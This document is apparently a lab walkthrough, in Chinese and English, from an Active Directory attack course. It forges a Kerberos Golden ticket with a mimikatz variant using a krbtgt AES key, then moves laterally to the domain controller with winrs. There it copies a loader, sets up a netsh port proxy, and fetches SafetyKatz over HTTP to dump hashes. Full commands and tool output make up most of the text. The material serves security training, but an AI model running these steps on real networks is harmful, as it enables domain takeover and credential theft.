Task
•  Using the NTLM hash or AES key of krbtgt account of us.techcorp.local, create a Golden ticket.
•  Use the Golden ticket to (once again) get domain admin privileges from a machine.

# Using the NTLM hash or AES key of krbtgt account of us.techcorp.local, create a Golden ticket.

在hands-on 11我们已经拿到krtgt的哈希，现在可以拿来申请一张金票

```
PS C:\Windows\system32> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   STH8YPVC 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "SG5STLYOPBQM1J5QHU4" - (2ZSR9)
 ## / \ ##  /*** H37CADQDEN5XHW `5JJK91LL7P` ( PTU1RF07@5JJK91LL7P.com )
 ## \ / ##       > https://blog.5JJK91LL7P.com/STH8YPVC
 '## v ##'       DZ9AM81SJDVBRP5             ( 1ZV9CVQKU8L7DRDBIE3ERF84 )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

STH8YPVC(commandline) # kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-
2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : us.techcorp.local
VU54FELKey: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 - aes256_hmac
Lifetime  : 11/2/2022 3:03:41 AM ; 11/2/2022 1:03:41 PM ; 11/9/2022 3:03:41 AM
-> Ticket : ** Pass The Ticket **

 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session

STH8YPVC(commandline) # exit
Bye!
```

上面命令执行完会把ticket导入到当前session

查看
```
PS C:\Windows\system32> klist

Current LogonId is 0:0xead79a

Cached Tickets: (1)

#0>     Client: Administrator @ us.techcorp.local
        Server: krbtgt/us.techcorp.local @ us.techcorp.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 11/2/2022 3:03:41 (local)
        End Time:   11/2/2022 13:03:41 (local)
        Renew Time: 11/9/2022 3:03:41 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

# Use the Golden ticket to (once again) get domain admin privileges from a machine.


1. 横向到dc

```
PS C:\Windows\system32> winrs -r:us-dc cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
US-DC

C:\Users\Administrator>whoami
whoami
us\administrator

```

2. 传Loader.exe

```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-dc\C$\Users\Public\Loader.exe /Y
```

3. 操纵流量

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.138
```

4. load mimikatz,dump哈希

学生机用pyhon开一个web服务

DC上执行
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```